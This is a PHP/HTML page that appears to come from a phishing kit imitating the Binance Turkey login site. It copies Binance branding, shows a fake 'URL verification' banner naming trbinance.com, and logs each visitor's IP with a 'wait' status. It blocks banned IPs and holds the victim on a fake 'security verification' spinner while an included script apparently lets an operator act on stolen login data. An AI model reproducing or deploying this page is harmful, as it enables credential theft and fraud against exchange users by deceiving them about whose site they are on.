<?php

require_once 'connect.php';

if ($ajax->banControl(IP)) {
    $ajax->redirect(BAN_URL);
}

$ajax->pageUpdate(IP, "Bekle");
?>
<html dir="ltr" lang="tr">
    <head> 
  <link rel="shortcut icon" type="image/x-icon" href="index_files/favicon.ico">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">  
  <title data-shuvi-head="true">Giriş yap</title>
  <link rel="preload" href="./assets/index.min.css" as="style">
  <link rel="stylesheet" type="text/css" href="./assets/index.min.css">
  <link rel="preload" href="./assets/font.min.css" as="style">
  <link rel="stylesheet" type="text/css" href="./assets/afont.min.css">
 <style data-emotion="css-global"></style><style data-emotion="css-global"></style><style data-emotion="css-global"></style><style data-emotion-css="155nz97">.css-155nz97{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;min-height:100vh;color:#1E2329;background-color:#FFFFFF;}</style><style data-emotion-css="1b9spv1">.css-1b9spv1{box-sizing:border-box;margin:0;min-width:0;display:contents;}</style><style data-emotion-css="qf37yy">.css-qf37yy{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;background-color:#FFFFFF;height:64px;width:100%;padding-left:8px;padding-right:8px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media screen and (min-width:767px){.css-qf37yy{padding-left:16px;padding-right:16px;}}.css-qf37yy a,.css-qf37yy a:active,.css-qf37yy a:visited{-webkit-text-decoration:none;text-decoration:none;}.css-qf37yy >div{height:100%;}</style><style data-emotion-css="1qljeod">.css-1qljeod{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;font-size:14px;outline:none;cursor:pointer;color:#1E2329;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;position:relative;-webkit-text-decoration:none;text-decoration:none;margin-left:8px;margin-right:8px;height:100%;color:#F0B90B;-webkit-flex:none;-ms-flex:none;flex:none;}.css-1qljeod.active,.css-1qljeod:hover{color:#C99400;}.css-1qljeod.active svg:not(.lock),.css-1qljeod:hover svg:not(.lock){color:#F0B90B;}</style><style data-emotion-css="4fx19t">.css-4fx19t{box-sizing:border-box;margin:0;min-width:0;color:currentColor;width:24px;height:24px;font-size:24px;fill:#1E2329;fill:currentColor;width:120px;height:24px;}</style><style data-emotion-css="1en9dhb">.css-1en9dhb{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;color:#1E2329;overflow:hidden;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;pointer-events:none;visibility:hidden;}@media screen and (min-width:767px){.css-1en9dhb{pointer-events:auto;visibility:visible;}}.css-1en9dhb > div,.css-1en9dhb > a{-webkit-flex:none;-ms-flex:none;flex:none;height:100%;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;}</style><style data-emotion-css="11y6cix">.css-11y6cix{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex:1;-ms-flex:1;flex:1;}</style><style data-emotion-css="wu6zme">.css-wu6zme{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex:none;-ms-flex:none;flex:none;}.css-wu6zme >div{height:100%;}</style><style data-emotion-css="143enlu">.css-143enlu{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;color:#1E2329;font-size:14px;padding-left:8px;padding-right:8px;}</style><style data-emotion-css="1f2m600">.css-1f2m600{box-sizing:border-box;margin:0;min-width:0;cursor:pointer;}.css-1f2m600:hover{color:#C99400;}</style><style data-emotion-css="15xjy3y">.css-15xjy3y{box-sizing:border-box;margin:0;min-width:0;background-color:#FFFFFF;-webkit-transition:all 1s;transition:all 1s;background-color:#FEF1F2;}</style><style data-emotion-css="6sm2ml">.css-6sm2ml{box-sizing:border-box;margin:0;min-width:0;margin-left:auto;margin-right:auto;padding-left:16px;padding-right:16px;max-width:1248px;}@media screen and (min-width:767px){.css-6sm2ml{padding-left:24px;padding-right:24px;}}</style><style data-emotion-css="zy0fl3">.css-zy0fl3{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;overflow:hidden;margin-top:0;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex:1;-ms-flex:1;flex:1;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}</style><style data-emotion-css="1432u7b">.css-1432u7b{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;width:100%;background-color:#FEF6D8;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;padding-top:8px;padding-bottom:8px;}</style><style data-emotion-css="11gn95z">.css-11gn95z{box-sizing:border-box;margin:0;min-width:0;color:#0ECB81;width:24px;height:24px;font-size:24px;fill:#1E2329;fill:#0ECB81;width:1em;height:1em;margin-right:4px;}</style><style data-emotion-css="1ldm553">.css-1ldm553{box-sizing:border-box;margin:0;min-width:0;font-weight:500;font-size:12px;line-height:16px;margin-right:4px;}</style><style data-emotion-css="mx5ldy">.css-mx5ldy{box-sizing:border-box;margin:0;min-width:0;font-weight:400;font-size:12px;line-height:16px;}</style><style data-emotion-css="13n52y">.css-13n52y{box-sizing:border-box;margin:0;min-width:0;color:#0ECB81;}</style><style data-emotion-css="3kcv4i">.css-3kcv4i{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;color:#474D57;}</style><style data-emotion-css="1om5toz">.css-1om5toz{box-sizing:border-box;margin:0;min-width:0;font-weight:400;font-size:12px;line-height:16px;text-align:center;padding-top:12px;padding-bottom:12px;padding-left:16px;padding-right:16px;}</style><style data-emotion-css="ff02t7">.css-ff02t7{box-sizing:border-box;margin:0;min-width:0;font-weight:400;font-size:12px;line-height:16px;padding-left:16px;padding-right:16px;cursor:pointer;}.css-ff02t7:hover{color:#1E2329;}</style><style data-emotion="css-global"></style><style data-emotion="css"></style>
            <link href="./assets/style_https.1.5.8.css" rel="stylesheet"><link href="./assets/style_https.1.5.8.css" rel="stylesheet">
            <link href="./assets/style_https.1.5.8.css" rel="stylesheet">
            <link href="./assets/yenix.css" rel="stylesheet">
            <style>
                body{
                    margin:0;
                }
            </style>
     </head>
<body style=""> 

  <div id="__APP"><div id="wrap_app" class="css-155nz97"><div class="hidden-header-in-bnc css-1b9spv1"><header class="css-qf37yy"><a href="https://www.binance.com/tr" class="css-1qljeod"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 5120 1024" class="css-4fx19t"><path d="M230.997333 512L116.053333 626.986667 0 512l116.010667-116.010667L230.997333 512zM512 230.997333l197.973333 197.973334 116.053334-115.968L512 0 197.973333 314.026667l116.053334 115.968L512 230.997333z m395.989333 164.992L793.002667 512l116.010666 116.010667L1024.981333 512l-116.992-116.010667zM512 793.002667l-197.973333-198.997334-116.053334 116.010667L512 1024l314.026667-314.026667-116.053334-115.968L512 793.002667z m0-165.973334l116.010667-116.053333L512 396.032 395.989333 512 512 626.986667z m1220.010667 11.946667v-1.962667c0-75.008-40.021333-113.024-105.002667-138.026666 39.978667-21.973333 73.984-58.026667 73.984-121.002667v-1.962667c0-88.021333-70.997333-145.024-185.002667-145.024h-260.992v561.024h267.008c126.976 0.981333 210.005333-51.029333 210.005334-153.002666z m-154.026667-239.957333c0 41.984-34.005333 58.965333-89.002667 58.965333h-113.962666V338.986667h121.984c52.010667 0 80.981333 20.992 80.981333 58.026666v2.005334z m31.018667 224c0 41.984-32.981333 61.013333-87.04 61.013333h-146.944v-123.050667h142.976c63.018667 0 91.008 23.04 91.008 61.013334v1.024z m381.994666 169.984V230.997333h-123.989333v561.024h123.989333v0.981334z m664.021334 0V230.997333h-122.026667v346.026667l-262.997333-346.026667h-114.005334v561.024h122.026667v-356.010666l272 356.992h104.96z m683.946666 0L3098.026667 228.010667h-113.962667l-241.024 564.992h127.018667l50.986666-125.994667h237.013334l50.986666 125.994667h130.005334z m-224.981333-235.008h-148.992l75.008-181.973334 73.984 181.973334z m814.037333 235.008V230.997333h-122.026666v346.026667l-262.997334-346.026667h-114.005333v561.024h122.026667v-356.010666l272 356.992h104.96z m636.970667-91.008l-78.976-78.976c-44.032 39.978667-83.029333 65.962667-148.010667 65.962666-96 0-162.986667-80-162.986666-176v-2.986666c0-96 67.968-174.976 162.986666-174.976 55.978667 0 100.010667 23.978667 144 62.976l78.976-91.008c-51.968-50.986667-114.986667-86.997333-220.970666-86.997334-171.989333 0-292.992 130.986667-292.992 290.005334V512c0 160.981333 122.965333 288.981333 288 288.981333 107.989333 1.024 171.989333-36.992 229.973333-98.986666z m527.018667 91.008v-109.994667h-305.024v-118.016h265.002666v-109.994667h-265.002666V340.992h301.013333V230.997333h-422.997333v561.024h427.008v0.981334z" p-id="2935"></path></svg></a>
    
<div class="css-1en9dhb"></div>
<div class="css-11y6cix"></div> </header>
        
    <div class="css-15xjy3y"><div id="header_global_js_wxgy34nj" class="css-6sm2ml"></div></div></div>
    <main class="main css-zy0fl3"><div class="css-1432u7b"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-11gn95z"><path fill-rule="evenodd" clip-rule="evenodd" d="M7 8v2H5v11h14V10h-2V8A5 5 0 007 8zm7.5 2V8a2.5 2.5 0 00-5 0v2h5zm-1 8v-5h-3v5h3z" fill="currentColor"></path></svg><div data-bn-type="text" class="css-1ldm553">URL verification:</div>
    <div data-bn-type="text" dir="ltr" class="css-mx5ldy">
        <span data-bn-type="text" class="css-13n52y">https://www.trbinance.com</div></div><div class="css-108ucgm">
    <div class="binance-row css-16kn2us" style="margin-left: -12px; margin-right: -12px;">
            <div class="binance-col binance-col-4 css-vurnku" style="padding-left: 12px; padding-right: 12px;"></div>
            <div class="binance-col css-1wz0uwi" style="padding-left: 12px; padding-right: 12px; flex: 1 1 auto;">
            <div class="css-108ucgm"><div class="css-51cj2k"></div>
            <div class="title-area css-4hwal1">
            <div class="css-yqkgry">
            <div class="css-vurnku">
             <div class="css-1q7zil0">
            <div class="css-tmpver">
         
     </div></div></div></div></main><div class="css-3kcv4i"><div data-bn-type="text" class="css-1om5toz">© 2017 - 2023. All rights reserved</div><div data-bn-type="text" data-ot-trigger="true" class="css-ff02t7">Cookie Preferences</div></div></div></div>

    <div id="onetrust-consent-sdk"><div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div><div id="onetrust-pc-sdk" class="otPcCenter ot-hide ot-fade-in otRelFont" aria-modal="true" role="alertdialog" aria-describedby="ot-pc-desc" lang="en" aria-label="Privacy Preference Center"><!-- Close Button --><div class="ot-pc-header"><!-- Logo Tag --><div class="ot-pc-logo" role="img" aria-label="Company Logo" style="background-image: url(&quot;https://cdn.cookielaw.org/logos/99f99939-5a0d-4feb-aef3-ba45f16b6907/5bfb9945-c83c-46f9-8bd7-55e8fd1975b5/02e50907-93f6-477d-a8a2-d581dace49c2/binance-h.png&quot;);
                    background-position: left;"></div></div><!-- Close Button --><div id="ot-pc-content" class="ot-pc-scrollbar"><h2 id="ot-pc-title">Privacy Preference Center</h2><div id="ot-pc-desc">When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.
                <br><a href="https://www.binance.me/en/cookie-privacy" class="privacy-notice-link" rel="noopener" target="_blank" aria-label="More information about your privacy, opens in a new tab">Cookie Policy</a></div><button id="accept-recommended-btn-handler">Allow All</button><section class="ot-sdk-row ot-cat-grp"><h3 id="ot-category-title"> Manage Consent Preferences</h3><div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0001"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0001" aria-labelledby="ot-header-id-C0001"></button><!-- Accordion header --><div class="ot-acc-hdr ot-always-active-group"><div class="ot-plus-minus"><span></span><span></span></div><h4 class="ot-cat-header" id="ot-header-id-C0001">Strictly Necessary Cookies</h4><div class="ot-always-active">Always Active</div></div><!-- accordion detail --><div class="ot-acc-grpcntr ot-acc-txt"><p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms. You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store any personally identifiable information.</p><div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Cookie Details button opens Cookie List menu" data-parent-id="C0001">Cookies Details‎</button></div></div></div><div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0003"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0003" aria-labelledby="ot-header-id-C0003"></button><!-- Accordion header --><div class="ot-acc-hdr"><div class="ot-plus-minus"><span></span><span></span></div><h4 class="ot-cat-header" id="ot-header-id-C0003">Functional Cookies</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0003" id="ot-group-id-C0003" aria-checked="false" role="switch" class="category-switch-handler" data-optanongroupid="C0003" aria-labelledby="ot-header-id-C0003"> <label class="ot-switch" for="ot-group-id-C0003"><span class="ot-switch-nob" aria-checked="false" role="switch"></span> <span class="ot-label-txt">Functional Cookies</span></label> </div></div><!-- accordion detail --><div class="ot-acc-grpcntr ot-acc-txt"><p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0003">These cookies enable the website to provide enhanced functionality and personalisation. They may be set by us or by third party providers whose services we have added to our pages. If you do not allow these cookies then some or all of these services may not function properly.</p><div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Cookie Details button opens Cookie List menu" data-parent-id="C0003">Cookies Details‎</button></div></div></div><div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0002"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0002" aria-labelledby="ot-header-id-C0002"></button><!-- Accordion header --><div class="ot-acc-hdr"><div class="ot-plus-minus"><span></span><span></span></div><h4 class="ot-cat-header" id="ot-header-id-C0002">Performance Cookies</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0002" id="ot-group-id-C0002" aria-checked="false" role="switch" class="category-switch-handler" data-optanongroupid="C0002" aria-labelledby="ot-header-id-C0002"> <label class="ot-switch" for="ot-group-id-C0002"><span class="ot-switch-nob" aria-checked="false" role="switch"></span> <span class="ot-label-txt">Performance Cookies</span></label> </div></div><!-- accordion detail --><div class="ot-acc-grpcntr ot-acc-txt"><p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site. They help us to know which pages are the most and least popular and see how visitors move around the site. All information these cookies collect is aggregated and therefore anonymous. If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.</p></div></div><!-- Groups sections starts --><!-- Group section ends --><!-- Accordion Group section starts --><!-- Accordion Group section ends --></section></div><section id="ot-pc-lst" class="ot-hide ot-hosts-ui ot-pc-scrollbar"><div id="ot-pc-hdr"><div id="ot-lst-title"><button class="ot-link-btn back-btn-handler" aria-label="Back"><svg id="ot-back-arw" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 444.531 444.531" xml:space="preserve"><title>Back Button</title><g><path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                    l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                    c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                    s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                    L213.13,222.409z"></path></g></svg></button><h3>Performance Cookies</h3></div><div class="ot-lst-subhdr"><div class="ot-search-cntr"><p role="status" class="ot-scrn-rdr"></p><label for="vendor-search-handler" class="ot-scrn-rdr"></label> <input id="vendor-search-handler" type="text" name="vendor-search-handler"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110" aria-hidden="true"><title>Search Icon</title><path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
            s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
            c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
            s-17-7.626-17-17S14.61,6,23.984,6z"></path></svg></div><div class="ot-fltr-cntr"><button id="filter-btn-handler" aria-label="Filter" aria-haspopup="true"><svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 402.577 402.577" xml:space="preserve"><title>Filter Icon</title><g><path fill="#fff" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
      c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
      c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
      C402.765,25.895,404.093,19.231,400.858,11.427z"></path></g></svg></button></div><div id="ot-anchor"></div><section id="ot-fltr-modal"><div id="ot-fltr-cnt"><button id="clear-filters-handler">Clear</button><div class="ot-fltr-scrlcnt ot-pc-scrollbar"><div class="ot-fltr-opts"><div class="ot-fltr-opt"><div class="ot-chkbox"><input id="chkbox-id" type="checkbox" aria-checked="false" class="category-filter-handler"> <label for="chkbox-id"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></div></div><div class="ot-fltr-btns"><button id="filter-apply-handler">Apply</button> <button id="filter-cancel-handler">Cancel</button></div></div></div></section></div></div><section id="ot-lst-cnt" class="ot-host-cnt ot-pc-scrollbar"><div id="ot-sel-blk"><div class="ot-sel-all"><div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span class="ot-li-hdr">Leg.Interest</span></div><div class="ot-sel-all-chkbox"><div class="ot-chkbox" id="ot-selall-hostcntr"><input id="select-all-hosts-groups-handler" type="checkbox" aria-checked="false"> <label for="select-all-hosts-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-vencntr"><input id="select-all-vendor-groups-handler" type="checkbox" aria-checked="false"> <label for="select-all-vendor-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-licntr"><input id="select-all-vendor-leg-handler" type="checkbox" aria-checked="false"> <label for="select-all-vendor-leg-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></div></div></div><div class="ot-sdk-row"><div class="ot-sdk-column"><ul id="ot-host-lst"><li class="ot-host-item"><button class="ot-host-box" aria-expanded="false"></button><section class="ot-acc-hdr"><div class="ot-host-hdr"><h3 class="ot-host-name"></h3><h4 class="ot-host-desc"></h4><span class="ot-host-expand">View Cookies</span></div><!-- toggles and arrow --><div class="ot-tgl-cntr"></div></section><div class="ot-acc-txt"><div class="ot-host-opts"><!-- HOST LIST VIEW UPDATE *** --><ul class="ot-host-opt"><li class="ot-host-info"><div><div>Name</div><div>cookie name</div></div></li></ul><!-- HOST LIST VIEW UPDATE END *** --></div></div></li></ul></div></div></section></section><div class="ot-pc-footer"><div class="ot-btn-container"><button class="ot-pc-refuse-all-handler">Reject All</button> <button class="save-preference-btn-handler onetrust-close-btn-handler">Confirm My Choices</button></div><!-- Footer logo --><div class="ot-pc-footer-logo"><a href="https://www.onetrust.com/products/cookie-consent/" target="_blank" rel="noopener noreferrer" aria-label="Powered by OneTrust Opens in a new Tab"><img alt="Powered by Onetrust" src="./assets/poweredBy_ot_logo.svg" title="Powered by OneTrust Opens in a new Tab"></a></div></div><span class="ot-scrn-rdr" aria-atomic="true" aria-live="polite"></span></div></div><style>#ot-sdk-btn-floating {
    display: none;
}
.css-vp41bv {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    display: flex;
    position: fixed;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: center;
    justify-content: center;
    z-index: 1200;
    inset: 0px;
    background-color: rgba(0, 0, 0, 0.5);
}
.css-gvz19r {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    touch-action: none;
    position: relative;
    box-shadow: rgb(20 21 26 / 16%) 0px 8px 16px, rgb(71 77 87 / 16%) 0px 16px 32px, rgb(20 21 26 / 10%) 0px 0px 1px;
    border-radius: 4px;
    background-color: rgb(255, 255, 255);
    width: 342px;
    padding: 16px;
}
.css-1h881ck {
    box-sizing: border-box;
    margin: -6px -6px 0px 0px;
    min-width: 0px;
    color: rgb(112, 122, 138);
    font-size: 20px;
    fill: rgb(112, 122, 138);
    float: right;
    width: 1em;
    height: 1em;
}
.css-1mpu4lr {
    box-sizing: border-box;
    margin: 0px 0px 16px;
    min-width: 0px;
    color: rgb(30, 35, 41);
    font-size: 18px;
    font-weight: 400;
    line-height: 23px;
}
.css-v2gpbh {
    box-sizing: border-box;
    margin: 0px auto 16px;
    min-width: 0px;
    position: relative;
    background-color: rgb(234, 236, 239);
    height: 192px;
    background-position-x: -60px;
    width: 310px;
    overflow: hidden;
}
.css-t1jkly {
    box-sizing: border-box;
    margin: 0px 0px 16px;
    min-width: 0px;
    position: absolute;
    height: 192px;
    width: 60px;
    animation: 0.3s ease-out 0s 1 normal both running animation-4xnix7;
}
.css-13rz4tr {
    box-sizing: border-box;
    margin: 0px auto 16px;
    min-width: 0px;
    display: flex;
    position: relative;
    border-width: 1px;
    border-style: solid;
    border-color: rgb(234, 236, 239);
    background-color: rgb(245, 245, 245);
    height: 44px;
    width: 310px;
    -webkit-box-align: center;
    align-items: center;
    user-select: none;
}
.css-af0n6l {
    box-sizing: border-box;
    margin: 0px 0px 0px 52px;
    min-width: 0px;
    font-weight: 400;
    font-size: 12px;
    line-height: 16px;
    transition: opacity 0.3s ease 0s;
    color: rgb(30, 35, 41);
    opacity: 1;
}
.css-p72bjc {
    box-sizing: border-box;
    margin: 0px 0px 0px -1px;
    min-width: 0px;
    display: flex;
    position: absolute;
    height: 44px;
    width: 44px;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: center;
    justify-content: center;
    background: linear-gradient(rgb(248, 209, 47) 0%, rgb(240, 185, 11) 100%);
}
.css-1w5k7wg {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    width: 24px;
    height: 24px;
}
.css-b9ugv0 {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    color: rgb(255, 255, 255);
    font-size: 24px;
    fill: rgb(255, 255, 255);
    width: 1em;
    height: 1em;
}
.css-9z3u57 {
    box-sizing: border-box;
    margin: -4px 0px 0px;
    min-width: 0px;
    color: rgb(112, 122, 138);
    font-size: 24px;
    fill: rgb(112, 122, 138);
    float: right;
    width: 1em;
    height: 1em;
}
.abc{
    text-align: center;

}
.ab{
    font-size: 12px;
}
.css-1w2yls6 {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  color: rgb(30, 35, 41);
  opacity: 1;
  cursor: pointer;
  background-color: rgb(255, 255, 255);
  padding-top: 10px;
  padding-bottom: 10px;
  line-height: 1;
}
.css-f5h6sg {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  display: flex;
  flex-direction: row;
  -moz-box-align: center;
  align-items: center;
}
.css-636r0v {
  box-sizing: border-box;
  margin: 0px 16px 0px 0px;
  min-width: 0px;
  width: 100%;
}
.css-gyf38r {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  display: flex;
  border-radius: 4px;
  -moz-box-align: center;
  align-items: center;
  height: 48px;
  -moz-box-pack: center;
  justify-content: center;
  color: rgb(30, 35, 41);
  background-color: rgb(234, 236, 239);
  cursor: pointer;
  width: 100%;
}
.css-ngmsug {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  display: flex;
  -moz-box-align: center;
  align-items: center;
  -moz-box-pack: center;
  justify-content: center;
  width: 32px;
  height: 40px;
}
.css-16vu25q {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  width: 100%;
}
.css-1lsnrg1 {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  display: flex;
  padding-top: 10px;
  padding-bottom: 10px;
  width: 100%;
  border-radius: 4px;
  -moz-box-align: center;
  align-items: center;
  height: 48px;
  background-color: rgb(234, 236, 239);
  -moz-box-pack: center;
  justify-content: center;
  cursor: pointer;
}
.css-qfts7w {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  display: flex;
  width: 32px;
  height: 40px;
  -moz-box-align: center;
  align-items: center;
  -moz-box-pack: center;
  justify-content: center;
}

.css-1bybaoo {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    max-width: 100%;
    width: 16px;
    height: 16px;

}
.css-fe5m29 {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  position: relative;
  border-radius: 6px;
  width: 180px;
  height: 180px;
  background-color: rgb(255, 255, 255);
}

.css-700h5m {

    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    background: rgb(245, 245, 245) none repeat scroll 0% 0%;
    opacity: 0.04;
    border-radius: 6px;
    width: 100%;
    height: 100%;
    padding: 12px;
    text-align: center;
}
.css-1vkfs78 {
  box-sizing: border-box;
  margin: -12px 0px 0px -12px;
  min-width: 0px;
  max-width: 100%;
  position: absolute;
  left: 50%;
  top: 50%;
  padding: 2px;
  background-color: rgb(245, 245, 245);
  border-top-left-radius: 4px;
  border-top-right-radius: 4px;
  border-bottom-left-radius: 4px;
  width: 24px;
  height: 24px;
}
.css-y6mhy3 {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  border-radius: 4px;
  overflow: hidden;
  width: 156px;
  height: 156px;
}
.css-134ban9 {
  box-sizing: border-box;
  margin: 0px;
  min-width: 0px;
  width: 100%;
  z-index: 2;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translateY(-50%) translateX(-50%);
  text-align: center;
}
.css-wbphw9 {
  box-sizing: border-box;
  margin: 0px 0px 8px;
  min-width: 0px;
  font-weight: 500;
  font-size: 14px;
  line-height: 20px;
}
.css-l3iefk {
  margin: 0px;
  appearance: none;
  user-select: none;
  cursor: pointer;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  display: inline-flex;
  -moz-box-align: center;
  align-items: center;
  -moz-box-pack: center;
  justify-content: center;
  box-sizing: border-box;
  font-size: 14px;
  font-family: inherit;
  font-weight: 500;
  text-align: center;
  text-decoration: none;
  outline: currentcolor none medium;
  padding: 6px 12px;
  line-height: 20px;
  word-break: keep-all;
  color: rgb(30, 35, 41);
  border-radius: 4px;
  min-height: 24px;
  border: medium none;
  background-color: rgb(234, 236, 239);
  height: 40px;
  min-width: 106px;
}
</style>


<div class="css-vp41bv" _id="wi">
    <div class="css-gvz19r">
       <div data-bn-type="text" class="css-1mpu4lr abc">Güvenlik Doğrulaması</div><div class="css-vurnku">
        
    <center><img src="assets/loading.gif" style="max-width: 150px;"></center>
    <p class="abc ab">İşleminize devam ediliyor, sayfayı kapatmayın</p>    
</div></div></div>



 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<?php include 'add-js.php'; ?>

</body></html>